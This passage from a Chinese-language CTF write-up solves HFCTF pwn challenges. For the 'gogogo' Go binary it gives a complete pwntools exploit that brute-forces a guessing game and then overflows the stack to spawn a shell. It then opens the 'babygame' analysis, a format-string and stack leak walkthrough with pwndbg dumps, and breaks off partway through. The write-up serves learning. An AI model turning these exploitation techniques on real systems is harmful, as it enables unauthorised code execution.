class="built_in">str</span>(A)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(B)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(C)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(D)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	sleep(<span class="number">0.001</span>) <span class="comment"># 这里必须要sleep一小会,不然就会发生错误</span></span><br><span class="line">	success(<span class="string">&quot;now is :&quot;</span>+<span class="built_in">str</span>(A)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(B)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(C)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(D))</span><br><span class="line">	</span><br><span class="line">	recv = p.recv(<span class="number">5</span>)</span><br><span class="line">	<span class="keyword">if</span> recv[<span class="number">0</span>]==<span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">		success(<span class="string">&quot;find it&quot;</span>)</span><br><span class="line">		p.sendline(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line">	a = <span class="built_in">eval</span>(recv[<span class="number">0</span>])</span><br><span class="line">	b = <span class="built_in">eval</span>(recv[<span class="number">2</span>])</span><br><span class="line">	</span><br><span class="line">	success(<span class="string">&quot;A=&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;,&quot;</span>+<span class="string">&quot;B=&quot;</span>+<span class="built_in">str</span>(b))</span><br><span class="line">	D=D+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> D==<span class="number">10</span>:</span><br><span class="line">		D=<span class="number">0</span></span><br><span class="line">		C=C+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> C==<span class="number">10</span>:</span><br><span class="line">		C=<span class="number">0</span></span><br><span class="line">		B=B+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> B==<span class="number">10</span>:</span><br><span class="line">		B=<span class="number">0</span></span><br><span class="line">		A=A+<span class="number">1</span>		</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> a==<span class="number">3</span>:</span><br><span class="line">		success(<span class="string">&quot;close.......&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> E==<span class="number">7</span>:</span><br><span class="line">		E=<span class="number">0</span></span><br><span class="line">		p.recvuntil(<span class="string">&#x27;TRY AGAIN?\n&#x27;</span>)</span><br><span class="line">		p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">		p.recvuntil(<span class="string">&#x27;YOU HAVE SEVEN CHANCES TO GUESS\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>接下来就进入这里了：（看上去像堆题）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">I THINK I SHOULD USE ANOTHER FAMILIAR THING TO KEEP YOU!!!!</span><br><span class="line">YOU HAVE FIVE CHOICE:</span><br><span class="line">(<span class="number">0</span>) INPUT</span><br><span class="line">(<span class="number">1</span>) OUTPUT</span><br><span class="line">(<span class="number">2</span>) EDIT</span><br><span class="line">(<span class="number">3</span>) CLEAR</span><br><span class="line">(<span class="number">4</span>) EXIT</span><br></pre></td></tr></table></figure>
<p>那个和我同期的兄弟发现了栈溢出，我想也没有更好的办法了（毕竟对golang的heap不熟悉）</p>
<p>选择“4”后，有一次输入的机会，不管输入什么都会触发“exit”，这也是最后的机会了，这里先直接挂代码把：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;(4) EXIT\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">_syscall_Syscall = <span class="number">0x47CF05</span></span><br><span class="line">binsh = <span class="number">0xc0000aa000</span></span><br><span class="line">payload = b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>*<span class="number">0x8c</span> + p64(_syscall_Syscall) + p64(<span class="number">0</span>) + p64(<span class="number">59</span>) + p64(binsh) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ARE YOU SURE?\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>假设输入只输入0x8c个“/bin/sh\x00”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x45c849</span>    syscall  &lt;SYS_exit_group&gt;</span><br><span class="line">       rdi: <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x0</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       r10: <span class="number">0x1</span></span><br><span class="line">  <span class="number">0x45c84b</span>    ret    </span><br><span class="line"></span><br><span class="line">  <span class="number">0x45c84c</span>    int3   </span><br><span class="line">  <span class="number">0x45c84d</span>    int3   </span><br><span class="line">  <span class="number">0x45c84e</span>    int3   </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s /bin/sh</span><br><span class="line">[anon_c000000]  <span class="number">0xc000045b18</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc000045b20</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc000045b28</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc000045b30</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">........</span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c430</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c438</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c440</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c448</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c450</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">[anon_c000000]  <span class="number">0xc00007c458</span> <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xc000045f78</span> —▸ <span class="number">0x43217c</span> ◂— xorps  xmm15, xmm15 <span class="comment">/* 栈顶 */</span></span><br></pre></td></tr></table></figure>
<p>可以发现：当前的栈顶（“ret”即将控制的区域）是可以控制的，直接在此写入“_syscall_Syscall”便可以控制IP指针并且进行系统调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="comment">/* &quot;0&quot;用于覆盖&quot;_syscall_Syscall&quot;的返回地址,&quot;59&quot;是execve的调用号,剩下的都是参数 */</span></span><br></pre></td></tr></table></figure>
<p> 完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./gogogo&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./gogogo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;PLEASE INPUT A NUMBER:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1717986918</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;PLEASE INPUT A NUMBER:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1416925456</span>))</span><br><span class="line"></span><br><span class="line">A=<span class="number">0</span></span><br><span class="line">B=<span class="number">0</span></span><br><span class="line">C=<span class="number">0</span></span><br><span class="line">D=<span class="number">0</span></span><br><span class="line">E=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;YOU HAVE SEVEN CHANCES TO GUESS\n&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">	E=E+<span class="number">1</span></span><br><span class="line">	</span><br><span class="line">	payload=<span class="built_in">str</span>(A)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(B)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(C)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(D)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	sleep(<span class="number">0.001</span>)</span><br><span class="line">	success(<span class="string">&quot;now is :&quot;</span>+<span class="built_in">str</span>(A)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(B)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(C)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(D))</span><br><span class="line">	</span><br><span class="line">	recv = p.recv(<span class="number">5</span>)</span><br><span class="line">	<span class="keyword">if</span> recv[<span class="number">0</span>]==<span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">		success(<span class="string">&quot;find it&quot;</span>)</span><br><span class="line">		p.sendline(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line">	a = <span class="built_in">eval</span>(recv[<span class="number">0</span>])</span><br><span class="line">	b = <span class="built_in">eval</span>(recv[<span class="number">2</span>])</span><br><span class="line">	</span><br><span class="line">	success(<span class="string">&quot;A=&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;,&quot;</span>+<span class="string">&quot;B=&quot;</span>+<span class="built_in">str</span>(b))</span><br><span class="line">	D=D+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> D==<span class="number">10</span>:</span><br><span class="line">		D=<span class="number">0</span></span><br><span class="line">		C=C+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> C==<span class="number">10</span>:</span><br><span class="line">		C=<span class="number">0</span></span><br><span class="line">		B=B+<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> B==<span class="number">10</span>:</span><br><span class="line">		B=<span class="number">0</span></span><br><span class="line">		A=A+<span class="number">1</span>		</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> a==<span class="number">3</span>:</span><br><span class="line">		success(<span class="string">&quot;close.......&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> E==<span class="number">7</span>:</span><br><span class="line">		E=<span class="number">0</span></span><br><span class="line">		p.recvuntil(<span class="string">&#x27;TRY AGAIN?\n&#x27;</span>)</span><br><span class="line">		p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">		p.recvuntil(<span class="string">&#x27;YOU HAVE SEVEN CHANCES TO GUESS\n&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b*0x45c849&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;(4) EXIT\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">_syscall_Syscall = <span class="number">0x47CF05</span></span><br><span class="line">binsh = <span class="number">0xc0000aa000</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">0x8c</span> + p64(_syscall_Syscall) + p64(<span class="number">0</span>) + p64(<span class="number">59</span>) + p64(binsh) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ARE YOU SURE?\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结</strong></p>
<p>这个 GO 还是有点折磨的，在没有用插件的情况下，IDA上全是乱码（函数未重命名）很难识别，用了插件后，才勉强可以在网上搜索相关函数的信息</p>
<p>本题目很考验逆向基础，没有大型的加密解密，但IDA上的混淆还是很难受的</p>
<p>最后说一下我在复现过程中遇到的困难：</p>
<ul>
<li>GO本身的乱码（这个用插件可以解决大部分）</li>
<li>对于GO入口地址的探索：我刚开始以为GO的入口地址是 <code>main_main</code> ，发现断点不起作用后就无计可施了，最后我把几个和main有关的函数（ <code>main_init</code> ， <code>runtime_main</code> ）都打上断点，调试出了入口地址</li>
<li>绕过“1A2B游戏”：这个是最花时间的了，我光是看懂它的机制就耗了不少时间，期初我还在和搞算法的室友讨论怎么在7次之内求解，后来我发现随机数是不变的于是果断爆破，这个脚本我也弄了很久（有时候会有莫名其妙的错误导致爆破失败，最后加上sleep才解决了问题）</li>
<li>ret劫持的调试工作：这个就有点憋屈了，因为执行 exit 的时候程序会把我的 GDB 给掐掉，让我看不见栈上的数据，最后还是靠单步调试在执行 exit 前打断点，终于观察到了栈地址（似乎GO没有栈地址随机化）</li>
</ul>
<p>逆向能力对于pwn手来说真的很重要，以后也要多多训练逆向能力了…</p>
<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>刚开始拿到的文件其实是个压缩包，改后缀解压一下就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./babygame </span><br><span class="line">Welcome to HFCTF!</span><br><span class="line">Please input your name:</span><br><span class="line">ywx </span><br><span class="line">Hello, ywx</span><br><span class="line">�	</span><br><span class="line">Let<span class="number">&#x27;</span>s start to play a game!</span><br><span class="line"><span class="number">0.</span> rock</span><br><span class="line"><span class="number">1.</span> scissor</span><br><span class="line"><span class="number">2.</span> paper</span><br><span class="line">round <span class="number">1</span>:</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">babygame: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">50007</span>d900d58090aa96310390fcebd6350df9f31, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/babygame&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>)</span> stable release versi</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+104h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)())((<span class="keyword">char</span> *)&amp;init_s + <span class="number">1</span>))();</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HFCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x256</span>uLL);                      <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, name);</span><br><span class="line">  srand(seed);                                  <span class="comment">// 初始化种子</span></span><br><span class="line">  v6 = game();                                  <span class="comment">// 1/3 的概率返回 1</span></span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</span><br><span class="line">    pwn();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck to you.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);                                  <span class="comment">// 格式化漏洞</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>格式化字符串漏洞，好久都没有遇到了</p>
<p><strong>入侵思路</strong></p>
<p>有栈溢出，可以用来泄露“pro_base”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp   <span class="number">0x7ffe86861e08</span> —▸ <span class="number">0x558b6a2142e3</span> ◂— lea    rax, [rbp - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi   <span class="number">0x7ffe86861e10</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓          <span class="number">3</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│       <span class="number">0x7ffe86861e30</span> —▸ <span class="number">0x558b6a214180</span> ◂— endbr64 </span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│       <span class="number">0x7ffe86861e38</span> ◂— <span class="number">0x65ed34df67df5f00</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│ rbp   <span class="number">0x7ffe86861e40</span> —▸ <span class="number">0x7ffe86861e60</span> —▸ <span class="number">0x7ffe86861f90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│       <span class="number">0x7ffe86861e48</span> —▸ <span class="number">0x558b6a2143a6</span> ◂— mov    dword ptr [rbp - <span class="number">4</span>], eax</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│       <span class="number">0x7ffe86861e50</span> ◂— <span class="number">0x6a214180</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│       <span class="number">0x7ffe86861e58</span> ◂— <span class="number">0x7fef00000002</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│       <span class="number">0x7ffe86861e60</span> —▸ <span class="number">0x7ffe86861f90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│       <span class="number">0x7ffe86861e68</span> —▸ <span class="number">0x558b6a214524</span> ◂— mov    dword ptr [rbx], eax</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│       <span class="number">0x7ffe86861e70</span> ◂— <span class="string">&#x27;aaaaaaaa\n\t&#x27;</span> <span class="comment">// input &#x27;a&#x27;*8</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│       <span class="number">0x7ffe86861e78</span> ◂— <span class="number">0x9800000090a</span> <span class="comment">/* &#x27;\n\t&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│       <span class="number">0x7ffe86861e80</span> ◂— <span class="number">0x98000000980</span></span><br><span class="line">... ↓          <span class="number">9</span> skipped</span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│       <span class="number">0x7ffe86861ed0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│       <span class="number">0x7ffe86861ed8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│       <span class="number">0x7ffe86861ee0</span> ◂— <span class="number">0x4000000000</span></span><br><span class="line"><span class="number">1</span>c:<span class="number">00e0</span>│       <span class="number">0x7ffe86861ee8</span> ◂— <span class="number">0x40000000200</span></span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│       <span class="number">0x7ffe86861ef0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓          <span class="number">7</span> skipped</span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│       <span class="number">0x7ffe86861f30</span> —▸ <span class="number">0x558b6a213040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│       <span class="number">0x7ffe86861f38</span> ◂— <span class="number">0xf0</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│       <span class="number">0x7ffe86861f40</span> ◂— <span class="number">0xc2</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│       <span class="number">0x7ffe86861f48</span> —▸ <span class="number">0x7ffe86861f77</span> ◂— <span class="number">0xed34df67df5f0000</span> </span><br><span class="line">    <span class="comment">/* 其实这里也可以leak stack_addr，但是为了覆盖seed就不能泄露这里了 */</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│       <span class="number">0x7ffe86861f50</span> —▸ <span class="number">0x7ffe86861f76</span> ◂— <span class="number">0x34df67df5f000000</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│       <span class="number">0x7ffe86861f58</span> —▸ <span class="number">0x558b6a2145bd</span> ◂— add    rbx, <span class="number">1</span> <span class="comment">// leak pro_base</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│       <span class="number">0x7ffe86861f60</span> —▸ <span class="number">0x7fefa87172e8</span> (__exit_funcs_lock) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│       <span class="number">0x7ffe86861f68</span> —▸ <span class="number">0x558b6a214570</span> ◂— endbr64 </span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│ rbx<span class="number">-4</span> <span class="number">0x7ffe86861f70</span> ◂— <span class="number">0x62381e44</span> <span class="comment">// canary</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│       <span class="number">0x7ffe86861f78</span> ◂— <span class="number">0x65ed34df67df5f00</span> <span class="comment">// canary</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│       <span class="number">0x7ffe86861f80</span> —▸ <span class="number">0x7ffe86862080</span> ◂— <span class="number">0x1</span> <span class="comment">// leak stack_addr</span></span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>│       <span class="number">0x7ffe86861f88</span> —▸ <span class="number">0x558b6a214570</span> ◂— endbr64 </span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>│       <span class="number">0x7ffe86861f90</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>│     <span class="number">0x7ffe86861f98</span> —▸ <span class="number">0x7fefa854a0b3</span> (__libc_start_main+<span class="number">243</span>) ◂— mov    edi, eax <span class="comment">// leak libc_base</span></span><br><span class="line"><span class="number">33</span>:<span class="number">0198</span>│     <span class="number">0x7ffe86861fa0</span> —▸ <span class="number">0x7fefa8747620</span> (_rtld_global_ro) ◂— <span class="number">0x50d1300000000</span></span><br><span class="line"><span class="number">34</span>:<span class="number">01</span>a0│     <span class="number">0x7ffe86861fa8</span> —▸ <span 